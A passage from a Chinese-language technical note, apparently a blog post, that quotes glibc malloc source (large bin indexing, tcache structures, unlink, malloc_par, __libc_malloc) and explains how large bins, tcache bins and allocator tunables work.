class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32_big(sz)                                            \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-comment">// XXX It remains to be seen whether it is good to keep the widths of</span><br><span class="hljs-comment">// XXX the buckets the same or whether it should be scaled by a factor</span><br><span class="hljs-comment">// XXX of two as well.</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index(sz) \</span><br><span class="hljs-meta">  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \</span><br><span class="hljs-meta">   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \</span><br><span class="hljs-meta">   : largebin_index_32 (sz))</span><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018154602605.png" alt="image-20221018154602605"></p><p>largebins是一个双链的循环列表集合，每个列表都有一定范围内的空闲块。每个 arena 有63个 bigbins，每个 large bin负责容纳大小为0x400以上的空闲块。例如，一个0x400的 large bin存放大小在 0x400-0x430之间的空闲块，而一个0x2000的 large bin存放大小在0x2000-0x21f0之间的块。</p><p>每个大bin的头部都在它的arena中，尽管其中的后续块之间的链接是通过内联存储。当排序发生时，自由块只通过其竞技场的unsorted bin链接到其相应的 large bin。</p><p>large bin 是按大小顺序维护的，该 bin中最大的块可以通过bin的fd指针访问，最小的块可以通过 bk 访问。当一个块被链接到一个laege bin时，其用户数据的第一个四字节被重新用作前向指针（fd ），第二个四字节被重新用作后向指针（bk）。</p><p>第一个被链接到 largebin 的大小的块，其用户数据的第三个和第四个四字被重新用作跳过列表指针， 分别是fd_nextsize和bk_nextsize。这些nextsize指针形成了另一个双链接的循环列表，其中包含了链接到该bin的每个大小的第一个块。一旦其大小的第一个块被链接到一个laege bin中，随后的相同大小的块被添加到该大小的第一个块之后，以避免重新路由跳过列表。</p><p>在请求期间，在unsorted bin扫描之后，但在binmap搜索之前，对大小为0x400及以上的块进行 large bin 的搜索。在 large bin搜索过程中，malloc确保适当的bin拥有足够大的块来支持请求；如果是这样，则从后往前扫描bin，寻找一个完全合适或更大的块。当它是其大小的最后一个块，malloc就分配持有跳过列表指针的块，否则它就分配跳过块之后的相同大小的块，这就避免了频繁地重新路由跳过列表。</p><p>任何来自 large bin 的非精确拟合分配都会被耗尽或剩余，但last_remainder字段不会被设置。</p><h3 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> TCACHE_FILL_COUNT 7</span><br><br><span class="hljs-comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span><br><span class="hljs-comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when</span><br><span class="hljs-comment">   the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-comment">// 2.27</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">// &gt;= 2.29</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>  <span class="hljs-comment">/* This field exists to detect double frees.  */</span><br>  <span class="hljs-type">uintptr_t</span> key;<br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-comment">// 2.27</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-comment">// &gt;= 2.30</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br></code></pre></td></tr></table></figure><p>在GLIBC主版本&gt;=2.26中，每个线程都被分配了自己的结构，称为tcache，或线程缓存。tcache 的行为就像一个 arena，但与 arena 不同的是，tcache不在线程之间共享。它们是通过在属于线程 arena 的堆上分配空间来创建的，并在线程退出时被释放。tcache的目的是缓解线程对malloc资源的争夺，给每个线程提供自己的块的集合，不与使用同一 arena 的其他线程共享 。 一个缓存的形式是一个tcache_perthread_struct，如下图11所示，它持有64个tcachebins的头部 ，前面是一个计数器阵列，记录了每个tcachebin中空闲块的数量。</p><p><img src="Heap.assets/image-20221020184215951.png" alt="image-20221020184215951"></p><p>在默认情况下，一个tcache持有大小为0x20-0x410（含） 的块。这些tcachebins的行为与fastbins类似，每个tcachebins都是一个单链的、非循环的特定大小的空闲块列表的头部。counts数组的第一个条目记录了链接到0x20 tcachebin的空闲块的 数量，第二个条目跟踪0x30 tcachebin，等等。</p><p>在默认情况下，tcachebin可以容纳的空闲块的数量是有限制的，这个数字在malloc_par结构中 的tcache_count字段中。当tcachebin的计数达到这个限制时，该bin大小的空闲块就会被当作没有tcache的情况下处理。例如，如果0x20 tcachebin已经满了（它持有7个空闲块），下一个 0x20大小的块将被释放到0x20 fastbin中。Malloc使用tcache的counts数组来确定bin是否已满。</p><p>在GLIBC版本&gt;=2.29中，链接到tcachebin的空闲块第二个的四字节被重新利用为 “key “字段，用于检测double情况。在GLIBC 2.34之前，tcache的key字段持有其tcache的地址，2.34及以后的版本使用一个随机值。</p><p><img src="Heap.assets/image-20221020221315361.png" alt="image-20221020221315361"></p><p>tcache fd 指针使用指向用户数据而不是块的元数据。</p><h3 id="bin-dependent"><a href="#bin-dependent" class="headerlink" title="bin dependent"></a>bin dependent</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))      \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><br><span class="hljs-comment">/* analog of ++bin */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))</span><br><br><span class="hljs-comment">/* Reminders about list directionality within bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> first(b)     ((b)-&gt;fd)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> last(b)      ((b)-&gt;bk)</span><br><br><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);                  \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                                      \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                                      \</span><br><span class="hljs-meta">    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \</span><br><span class="hljs-meta">      malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);                  \</span><br><span class="hljs-meta">    <span class="hljs-keyword">else</span> &#123;                                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                                  \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                                  \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (P))                  \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;              \</span><br><span class="hljs-meta">        <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \</span><br><span class="hljs-meta">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">          malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);   \</span><br><span class="hljs-meta">            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;                      \</span><br><span class="hljs-meta">                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)                      \</span><br><span class="hljs-meta">                 FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \</span><br><span class="hljs-meta">               <span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">                        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \</span><br><span class="hljs-meta">                        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \</span><br><span class="hljs-meta">                        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \</span><br><span class="hljs-meta">                        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \</span><br><span class="hljs-meta">                  &#125;                                  \</span><br><span class="hljs-meta">               &#125; <span class="hljs-keyword">else</span> &#123;                                  \</span><br><span class="hljs-meta">               P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \</span><br><span class="hljs-meta">               &#125;                                      \</span><br><span class="hljs-meta">          &#125;                                      \</span><br><span class="hljs-meta">      &#125;                                          \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list.  */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">unlink_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>);<br><br>  mchunkptr fd = p-&gt;fd;<br>  mchunkptr bk = p-&gt;bk;<br><br>  <span class="hljs-keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="hljs-number">0</span>))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list&quot;</span>);<br><br>  fd-&gt;bk = bk;<br>  bk-&gt;fd = fd;<br>  <span class="hljs-keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p<br>  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)<br>malloc_printerr (<span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>);<br><br>      <span class="hljs-keyword">if</span> (fd-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-keyword">if</span> (p-&gt;fd_nextsize == p)<br>    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;<br>      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;<br>    &#125;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;<br>  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;<br>&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="alignment-dependent"><a href="#alignment-dependent" class="headerlink" title="alignment dependent"></a>alignment dependent</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Check if m has acceptable alignment */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> misaligned_chunk(p) \</span><br><span class="hljs-meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span><br><span class="hljs-meta">   &amp; MALLOC_ALIGN_MASK)</span><br></code></pre></td></tr></table></figure><h3 id="malloc-par"><a href="#malloc-par" class="headerlink" title="malloc_par"></a>malloc_par</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Tunable parameters */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trim_threshold;<br>  INTERNAL_SIZE_T top_pad;<br>  INTERNAL_SIZE_T mmap_threshold;<br>  INTERNAL_SIZE_T arena_test;<br>  INTERNAL_SIZE_T arena_max;<br><br>  <span class="hljs-comment">/* Memory map support */</span><br>  <span class="hljs-type">int</span> n_mmaps;<br>  <span class="hljs-type">int</span> n_mmaps_max;<br>  <span class="hljs-type">int</span> max_n_mmaps;<br>  <span class="hljs-comment">/* the mmap_threshold is dynamic, until the user sets</span><br><span class="hljs-comment">     it manually, at which point we need to disable any</span><br><span class="hljs-comment">     dynamic behavior. */</span><br>  <span class="hljs-type">int</span> no_dyn_threshold;<br><br>  <span class="hljs-comment">/* Statistics */</span><br>  INTERNAL_SIZE_T mmapped_mem;<br>  INTERNAL_SIZE_T max_mmapped_mem;<br><br>  <span class="hljs-comment">/* First address handed out by MORECORE/sbrk.  */</span><br>  <span class="hljs-type">char</span> *sbrk_base;<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* Maximum number of buckets to use.  */</span><br>  <span class="hljs-type">size_t</span> tcache_bins;<br>  <span class="hljs-type">size_t</span> tcache_max_bytes;<br>  <span class="hljs-comment">/* Maximum number of chunks in each bucket.  */</span><br>  <span class="hljs-type">size_t</span> tcache_count;<br>  <span class="hljs-comment">/* Maximum number of chunks to remove from the unsorted list, which</span><br><span class="hljs-comment">     aren&#x27;t used to prefill the cache.  */</span><br>  <span class="hljs-type">size_t</span> tcache_unsorted_limit;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br><span class="hljs-comment">/* There is only one instance of the malloc parameters.  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_par</span> <span class="hljs-title">mp_</span> =</span><br>&#123;<br>  .top_pad = DEFAULT_TOP_PAD,<br>  .n_mmaps_max = DEFAULT_MMAP_MAX,<br>  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,<br>  .trim_threshold = DEFAULT_TRIM_THRESHOLD,<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span><br>  .arena_test = NARENAS_FROM_NCORES (<span class="hljs-number">1</span>)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> USE_TCACHE</span><br>  ,<br>  .tcache_count = TCACHE_FILL_COUNT,<br>  .tcache_bins = TCACHE_MAX_BINS,<br>  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="hljs-number">-1</span>),<br>  .tcache_unsorted_limit = <span class="hljs-number">0</span> <span class="hljs-comment">/* No limit.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><br></code></pre></td></tr></table></figure><ul><li>trim_threshold：在free()中被修剪前的最大顶部块大小，默认为0x20000。</li><li>top_pad： 当 扩大 top_chunk 时，需要申请多少额外的内存，默认为0x20000。</li><li>mmap_threshold：mmap()所服务的最小块大小，默认为0x20000。</li><li>arena_test：默认为8。</li><li>arena_max：默认为0。</li><li>n_mmaps：当前的mmapped chunk计数，从0开始。</li><li>n_mmaps_max：允许的最大mmapped chunks数量，默认为0x10000。 </li><li>max_n_mmaps：到 目前为止并发的mmapped chunks的最高数量。</li><li>no_dyn_threshold：是否禁用动态 mmap threshold行为。</li><li>mmapped_mem：当前有多少内存被mmapped。</li><li>max_mmapped_mem：一次性存在的最高mmapped内存量。</li><li>sbrk_base：由sbrk发放的1个st 地址。</li><li>tcache_bins： 要使用的tcache bins的数量，默认为0x40。</li><li>tcache_max_bytes：tcache chunks支持的最大用户数据，默认为0x408。</li><li>tcache_count：每个 tcachebin 中的最大块数，默认 7。</li><li>unsorted_limit：填充 tcache 时的最大 unsortedbin 迭代次数。</li></ul><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  malloc(size_t n)</span><br><span class="hljs-comment">  Returns a pointer to a newly allocated chunk of at least n bytes, or null</span><br><span class="hljs-comment">  if no space is available. Additionally, on failure, errno is</span><br><span class="hljs-comment">  set to ENOMEM on ANSI C systems.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  If n is zero, malloc returns a minumum-sized chunk. (The minimum</span><br><span class="hljs-comment">  size is 16 bytes on most 32bit systems, and 24 or 32 bytes on 64bit</span><br><span class="hljs-comment">  systems.)  On most systems, size_t is an unsigned type, so calls</span><br><span class="hljs-comment">  with negative arguments are interpreted as requests for huge amounts</span><br><span class="hljs-comment">  of space, which will often fail. The maximum supported value of n</span><br><span class="hljs-comment">  differs across systems, but is in all cases less than the maximum</span><br><span class="hljs-comment">  representable value of a size_t.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> *__libc_malloc(<span class="hljs-type">size_t</span> bytes) &#123;<br>    mstate ar_ptr; <span 